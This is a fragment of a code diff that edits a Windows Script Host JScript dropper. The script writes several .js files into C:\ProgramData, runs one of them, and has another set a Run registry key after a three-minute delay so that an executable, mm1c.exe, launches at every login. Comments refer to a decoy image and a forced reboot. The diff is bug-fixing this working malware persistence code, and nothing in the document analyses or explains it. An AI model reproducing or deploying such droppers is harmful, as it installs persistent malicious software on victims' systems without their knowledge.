@@ -30,7 +30,7 @@
     }
     shell.Environment('Process')('COMPLUS_Version') = ver;
     var p = new ActiveXObject("Scripting.FileSystemObject");
-    // var s = new ActiveXObject("Scripting.FileSystemObject");
+    var s = new ActiveXObject("Scripting.FileSystemObject");
     var x = new ActiveXObject("Scripting.FileSystemObject");
     if (1 || !p.FileExists("C://ProgramData//8292.png")) { // need to remove 1
       var o = p.CreateTextFile("C://ProgramData//kohl.js", 2 , true); // 2=true=overwrite, true=unicode
@@ -51,8 +51,8 @@
       h.Close();shell.run("C://ProgramData//update.js", 1);
       // {8292.png and kohl.js in ProgramData amd 8292.png is opened and dir'dvixm', and mm1.exe in ProgramData }
       
-      var s = s.CreateTextFile("C://ProgramData//parhai.js", 2, true);
-      s.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(180000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');s.Close();
+      var ss = s.CreateTextFile("C://ProgramData//parhai.js", 2, true);
+      ss.writeline('var oWSS = new ActiveXObject("WScript.Shell");WScript.Sleep(180000);oWSS.RegWrite("HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\", "C:\\\\ProgramData\\\\dvixm\\\\mm1\\\\mm1c.exe","REG_SZ");');ss.Close();
 
       // reboot
       var r = p.CreateTextFile("C://ProgramData//r.js", 2, true);
